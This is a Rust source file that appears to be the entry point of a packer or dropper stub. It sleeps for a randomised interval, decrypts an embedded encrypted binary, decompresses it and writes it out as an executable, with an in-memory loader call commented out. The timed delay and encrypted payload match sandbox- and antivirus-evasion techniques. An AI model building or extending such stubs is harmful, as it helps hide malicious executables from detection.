use brotli::DecompressorWriter;

use constants::*;
use rand::{thread_rng, Rng};
use std::{fs::File, io::Write, thread::sleep, time::Duration};

// use crate::loader::allocate_data;

mod constants;
mod deobfuscation;
mod loader;

fn main() {
    wait();

    let decrypted_binary = deobfuscation::decrypt_data(
        unsafe { &mut ENCRYPTED_BINARY },
        ENCRYPTION_KEY,
        ENCRYPTION_NONCE,
    );

    const ASLR: bool = false;

    // allocate_data(ASLR);

    let file = File::create("./test-crate.exe").unwrap();
    let mut writer = DecompressorWriter::new(file, 0);

    writer.write_all(decrypted_binary).unwrap();
}

fn wait() {
    if !TIMEOUT.is_zero() {
        let mut rng = thread_rng();
        let random_offset =
            Duration::from_millis(rng.gen_range(0..((TIMEOUT.as_millis() as u64) / 4)));
        if rng.gen_bool(0.5) {
            sleep(TIMEOUT - random_offset)
        } else {
            sleep(TIMEOUT + random_offset)
        }
    }
}